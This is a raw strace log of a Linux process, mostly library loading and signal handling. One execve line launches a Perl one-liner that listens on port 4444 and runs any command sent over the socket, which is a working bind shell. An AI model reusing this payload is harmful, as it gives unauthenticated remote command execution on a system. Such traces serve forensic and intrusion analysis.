\0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
13031 07:45:20.021032 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
13031 07:45:20.021049 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d78000
13031 07:45:20.021061 mmap2(0xb7d7f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7d7f000
13031 07:45:20.021077 close(1)          = 0
13031 07:45:20.021088 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
13031 07:45:20.021101 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
13031 07:45:20.021125 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
13031 07:45:20.021213 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
13031 07:45:20.021230 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d60000
13031 07:45:20.021245 mmap2(0xb7d74000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7d74000
13031 07:45:20.021261 mmap2(0xb7d76000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d76000
13031 07:45:20.021275 close(1)          = 0
13031 07:45:20.021301 munmap(0xb7f06000, 29913) = 0
13031 07:45:20.021318 open("/etc/ld.so.cache", O_RDONLY) = 1
13031 07:45:20.021331 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
13031 07:45:20.021347 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f06000
13031 07:45:20.021357 close(1)          = 0
13031 07:45:20.021367 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
13031 07:45:20.021381 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
13031 07:45:20.021395 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
13031 07:45:20.021485 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
13031 07:45:20.021502 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d56000
13031 07:45:20.021513 mmap2(0xb7d5e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d5e000
13031 07:45:20.021529 close(1)          = 0
13031 07:45:20.021541 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
13031 07:45:20.021554 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
13031 07:45:20.021569 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
13031 07:45:20.021665 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
13031 07:45:20.021683 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d4b000
13031 07:45:20.021695 mmap2(0xb7d54000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d54000
13031 07:45:20.021711 close(1)          = 0
13031 07:45:20.021731 munmap(0xb7f06000, 29913) = 0
13031 07:45:20.021751 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
13031 07:45:20.021765 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
13031 07:45:20.021776 _llseek(1, 0, [0], SEEK_CUR) = 0
13031 07:45:20.021788 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
13031 07:45:20.021804 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f0d000
13031 07:45:20.021815 _llseek(1, 1624, [1624], SEEK_SET) = 0
13031 07:45:20.021830 munmap(0xb7f0d000, 1624) = 0
13031 07:45:20.021840 close(1)          = 0
13031 07:45:20.021868 getpgrp()         = 3831
13031 07:45:20.021879 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
13031 07:45:20.021894 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
13031 07:45:20.021911 brk(0x8101000)    = 0x8101000
13031 07:45:20.021941 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
13031 07:45:20.021956 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
13031 07:45:20.021970 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
13031 07:45:20.022007 brk(0x8102000)    = 0x8102000
13031 07:45:20.022033 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
13031 07:45:20.022052 stat64("/sbin/AB", 0xbfba89f8) = -1 ENOENT (No such file or directory)
13031 07:45:20.022064 stat64("/bin/AB", 0xbfba89f8) = -1 ENOENT (No such file or directory)
13031 07:45:20.022076 stat64("/usr/sbin/AB", 0xbfba89f8) = -1 ENOENT (No such file or directory)
13031 07:45:20.022087 stat64("/usr/bin/AB", 0xbfba89f8) = -1 ENOENT (No such file or directory)
13031 07:45:20.022829 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
13031 07:45:20.022862 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d816f8) = 13032
13032 07:45:20.022925 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
13032 07:45:20.022942 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
13032 07:45:20.022955 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
13032 07:45:20.022967 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
13032 07:45:20.022982 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
13032 07:45:20.022998 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
13032 07:45:20.023011 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
13032 07:45:20.023066 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
13032 07:45:20.023080 --- SIGPIPE (Broken pipe) @ 0 (0) ---
13032 07:45:20.023146 exit_group(127)   = ?
4519  07:45:20.038311 waitpid(13031,  <unfinished ...>
13031 07:45:20.038312 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
13031 07:45:20.038312 --- SIGCHLD (Child exited) @ 0 (0) ---
13031 07:45:20.038312 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 13032
13031 07:45:20.038312 waitpid(-1, 0xbfba8678, WNOHANG) = -1 ECHILD (No child processes)
13031 07:45:20.038312 sigreturn()       = ? (mask now [])
13031 07:45:20.038313 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
13031 07:45:20.038323 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
13031 07:45:20.038334 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
13031 07:45:20.038347 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
13031 07:45:20.038364 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
13031 07:45:20.038376 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
13031 07:45:20.038409 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
13031 07:45:20.038428 stat64("/sbin/perl", 0xbfba8a28) = -1 ENOENT (No such file or directory)
13031 07:45:20.038440 stat64("/bin/perl", 0xbfba8a28) = -1 ENOENT (No such file or directory)
13031 07:45:20.038452 stat64("/usr/sbin/perl", 0xbfba8a28) = -1 ENOENT (No such file or directory)
13031 07:45:20.038463 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
13031 07:45:20.038481 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
13031 07:45:20.038505 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
13031 07:45:20.038520 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d816f8) = 13033
13033 07:45:20.038563 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
13033 07:45:20.038583 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
13033 07:45:20.038597 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
13033 07:45:20.038608 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
13033 07:45:20.038633 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
13033 07:45:20.038650 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
13033 07:45:20.038663 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
13033 07:45:20.038696 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
13033 07:45:20.038779 brk(0)            = 0x8153000
13033 07:45:20.038799 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
13033 07:45:20.038814 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f20000
13033 07:45:20.038829 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
13033 07:45:20.038846 open("/etc/ld.so.cache", O_RDONLY) = 1
13033 07:45:20.038858 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
13033 07:45:20.038875 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f18000
13033 07:45:20.038885 close(1)          = 0
13033 07:45:20.038896 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
13033 07:45:20.038911 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
13033 07:45:20.038925 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
13033 07:45:20.039017 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
13033 07:45:20.039034 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f14000
13033 07:45:20.039046 mmap2(0xb7f16000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f16000
13033 07:45:20.039062 close(1)          = 0
13033 07:45:20.039073 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
13033 07:45:20.039087 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
13033 07:45:20.039101 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
13033 07:45:20.039277 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
13033 07:45:20.039295 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eef000
13033 07:45:20.039306 mmap2(0xb7f12000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f12000
13033 07:45:20.039322 close(1)          = 0
13033 07:45:20.039334 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
13033 07:45:20.039347 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
13033 07:45:20.039362 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
13033 07:45:20.039448 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
13033 07:45:20.039465 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eee000
13033 07:45:20.039477 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ed6000
13033 07:45:20.039488 mmap2(0xb7eea000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7eea000
13033 07:45:20.039502 mmap2(0xb7eec000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7eec000
13033 07:45:20.039516 close(1)          = 0
13033 07:45:20.039527 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
13033 07:45:20.039540 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
13033 07:45:20.039554 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
13033 07:45:20.039642 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
13033 07:45:20.039660 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d87000
13033 07:45:20.039674 mmap2(0xb7ed0000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ed0000
13033 07:45:20.039689 mmap2(0xb7ed3000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ed3000
13033 07:45:20.039711 close(1)          = 0
13033 07:45:20.039724 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
13033 07:45:20.039738 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
13033 07:45:20.039752 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, 